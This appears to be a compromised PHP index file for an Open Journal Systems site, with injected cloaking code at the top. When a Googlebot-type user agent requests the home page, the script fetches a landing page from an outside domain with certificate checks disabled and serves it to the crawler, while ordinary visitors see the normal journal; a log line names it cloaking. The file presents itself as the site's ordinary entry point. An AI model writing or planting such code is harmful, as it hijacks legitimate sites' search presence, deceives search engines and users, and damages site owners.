<?php
$uri = $_SERVER['REQUEST_URI'];
function is_google_bot_v1(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

if($uri == '/' || $uri == '/index.php'){
    if(is_google_bot_v1()){
        $c = curl_init('https://freeportindonesia.org/landing/jkaa-bunghatta.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        $html = curl_exec($c);
        $httpCode = curl_getinfo($c, CURLINFO_HTTP_CODE);
        curl_close($c);
        if ($html !== false && $httpCode === 200) {
            header("Content-Type: text/html; charset=utf-8");
            echo $html;
            exit;
        } else {
            error_log("Cloaking gagal untuk: https://freeportindonesia.org/landing/jkaa-bunghatta.html (HTTP $httpCode)");
            // Lanjut ke autoloader OJS jika gagal
        }
    }
}

// ============================================================
require_once __DIR__ . '/lib/pkp/includes/bootstrap.inc.php';
?>
